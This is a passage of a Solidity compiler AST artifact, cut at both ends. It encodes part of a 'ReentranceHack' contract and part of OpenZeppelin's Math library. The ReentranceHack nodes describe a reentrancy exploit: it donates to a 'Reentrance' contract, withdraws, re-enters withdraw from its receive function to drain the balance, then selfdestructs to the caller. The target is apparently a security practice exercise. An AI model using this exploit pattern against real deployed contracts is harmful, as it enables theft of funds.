										"typeString": "contract Reentrance"
									},
									"typeName": {
										"contractScope": null,
										"id": 82,
										"name": "Reentrance",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 81,
										"src": "890:10:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Reentrance_$81",
											"typeString": "contract Reentrance"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 94,
										"nodeType": "Block",
										"src": "972:47:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 92,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 88,
														"name": "reentrance",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 83,
														"src": "978:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Reentrance_$81",
															"typeString": "contract Reentrance"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 90,
																"name": "_reentrance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 85,
																"src": "1002:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															],
															"id": 89,
															"name": "Reentrance",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 81,
															"src": "991:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_Reentrance_$81_$",
																"typeString": "type(contract Reentrance)"
															}
														},
														"id": 91,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "991:23:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Reentrance_$81",
															"typeString": "contract Reentrance"
														}
													},
													"src": "978:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_Reentrance_$81",
														"typeString": "contract Reentrance"
													}
												},
												"id": 93,
												"nodeType": "ExpressionStatement",
												"src": "978:36:0"
											}
										]
									},
									"documentation": null,
									"id": 95,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 86,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 85,
												"mutability": "mutable",
												"name": "_reentrance",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 95,
												"src": "936:27:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												},
												"typeName": {
													"id": 84,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "936:15:0",
													"stateMutability": "payable",
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "935:29:0"
									},
									"returnParameters": {
										"id": 87,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "972:0:0"
									},
									"scope": 155,
									"src": "924:95:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 125,
										"nodeType": "Block",
										"src": "1056:137:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 106,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -28,
																	"src": "1106:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_ReentranceHack_$155",
																		"typeString": "contract ReentranceHack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_ReentranceHack_$155",
																		"typeString": "contract ReentranceHack"
																	}
																],
																"id": 105,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1098:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 104,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1098:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 107,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1098:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 98,
																"name": "reentrance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 83,
																"src": "1062:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Reentrance_$81",
																	"typeString": "contract Reentrance"
																}
															},
															"id": 100,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "donate",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 28,
															"src": "1062:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_payable$_t_address_$returns$__$",
																"typeString": "function (address) payable external"
															}
														},
														"id": 103,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 101,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "1087:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 102,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "1087:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "1062:35:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_payable$_t_address_$returns$__$value",
															"typeString": "function (address) payable external"
														}
													},
													"id": 108,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1062:50:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 109,
												"nodeType": "ExpressionStatement",
												"src": "1062:50:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 113,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "1138:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 114,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "value",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "1138:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 110,
															"name": "reentrance",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 83,
															"src": "1118:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Reentrance_$81",
																"typeString": "contract Reentrance"
															}
														},
														"id": 112,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "withdraw",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 76,
														"src": "1118:19:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256) external"
														}
													},
													"id": 115,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1118:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 116,
												"nodeType": "ExpressionStatement",
												"src": "1118:30:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 120,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -15,
																		"src": "1176:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 121,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "1176:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																],
																"id": 119,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1168:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 118,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1168:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 122,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1168:19:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 117,
														"name": "selfdestruct",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": -21,
														"src": "1155:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
															"typeString": "function (address payable)"
														}
													},
													"id": 123,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1155:33:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 124,
												"nodeType": "ExpressionStatement",
												"src": "1155:33:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "9e5faafc",
									"id": 126,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 96,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1038:2:0"
									},
									"returnParameters": {
										"id": 97,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1056:0:0"
									},
									"scope": 155,
									"src": "1023:170:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 153,
										"nodeType": "Block",
										"src": "1224:144:0",
										"statements": [
											{
												"assignments": [
													130
												],
												"declarations": [
													{
														"constant": false,
														"id": 130,
														"mutability": "mutable",
														"name": "balance",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 153,
														"src": "1230:15:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 129,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1230:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 141,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 135,
																		"name": "reentrance",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 83,
																		"src": "1265:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_Reentrance_$81",
																			"typeString": "contract Reentrance"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_Reentrance_$81",
																			"typeString": "contract Reentrance"
																		}
																	],
																	"id": 134,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1257:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 133,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "1257:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 136,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1257:19:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 137,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "1257:27:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 138,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "1286:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 139,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "value",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "1286:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 131,
															"name": "Math",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 228,
															"src": "1248:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_Math_$228_$",
																"typeString": "type(library Math)"
															}
														},
														"id": 132,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "min",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 194,
														"src": "1248:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 140,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1248:48:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1230:66:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 144,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 142,
														"name": "balance",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 130,
														"src": "1307:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 143,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1317:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "1307:11:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 152,
												"nodeType": "IfStatement",
												"src": "1302:62:0",
												"trueBody": {
													"id": 151,
													"nodeType": "Block",
													"src": "1321:43:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 148,
																		"name": "balance",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 130,
																		"src": "1349:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"id": 145,
																		"name": "reentrance",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 83,
																		"src": "1329:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_Reentrance_$81",
																			"typeString": "contract Reentrance"
																		}
																	},
																	"id": 147,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "withdraw",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 76,
																	"src": "1329:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
																		"typeString": "function (uint256) external"
																	}
																},
																"id": 149,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1329:28:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 150,
															"nodeType": "ExpressionStatement",
															"src": "1329:28:0"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 154,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 127,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1204:2:0"
									},
									"returnParameters": {
										"id": 128,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1224:0:0"
									},
									"scope": 155,
									"src": "1197:171:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 156,
							"src": "861:509:0"
						}
					],
					"src": "32:1338:0"
				},
				"id": 0
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol": {
				"ast": {
					"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol",
					"exportedSymbols": {
						"Math": [
							228
						]
					},
					"id": 229,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 157,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 158,
								"nodeType": "StructuredDocumentation",
								"src": "58:73:1",
								"text": " @dev Standard math utilities missing in the Solidity language."
							},
							"fullyImplemented": true,
							"id": 228,
							"linearizedBaseContracts": [
								228
							],
							"name": "Math",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 175,
										"nodeType": "Block",
										"src": "282:38:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 170,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 168,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 161,
															"src": "299:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": ">=",
														"rightExpression": {
															"argumentTypes": null,
															"id": 169,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 163,
															"src": "304:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "299:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"argumentTypes": null,
														"id": 172,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 163,
														"src": "312:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 173,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "299:14:1",
													"trueExpression": {
														"argumentTypes": null,
														"id": 171,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 161,
														"src": "308:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 167,
												"id": 174,
												"nodeType": "Return",
												"src": "292:21:1"
											}
										]
									},
									"documentation": {
										"id": 159,
										"nodeType": "StructuredDocumentation",
										"src": "151:59:1",
										"text": " @dev Returns the largest of two numbers."
									},
									"id": 176,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "max",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 164,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 161,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 176,
												"src": "228:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 160,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "228:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 163,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 176,
												"src": "239:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 162,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "239:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "227:22:1"
									},
									"returnParameters": {
										"id": 167,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 166,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 176,
												"src": "273:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 165,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "273:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "272:9:1"
									},
									"scope": 228,
									"src": "215:105:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 193,
										"nodeType": "Block",
										"src": "458:37:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 188,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 186,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 179,
															"src": "475:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"id": 187,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 181,
															"src": "479:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "475:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"argumentTypes": null,
														"id": 190,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 181,
														"src": "487:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 191,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "475:13:1",
													"trueExpression": {
														"argumentTypes": null,
														"id": 189,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 179,
														"src": "483:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 185,
												"id": 192,
												"nodeType": "Return",
												"src": "468:20:1"
											}
										]
									},
									"documentation": {
										"id": 177,
										"nodeType": "StructuredDocumentation",
										"src": "326:60:1",
										"text": " @dev Returns the smallest of two numbers."
									},
									"id": 194,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "min",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 182,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 179,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 194,
												"src": "404:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 178,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "404:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 181,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 194,
												"src": "415:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 180,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "415:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "403:22:1"
									},
									"returnParameters": {
										"id": 185,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 184,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 194,
												"src": "449:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 183,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "449:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "448:9:1"
									},
									"scope": 228,
									"src": "391:104:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 226,
										"nodeType": "Block",
										"src": "679:119:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 224,
													"isConstant": false,
													"isLValue": false,
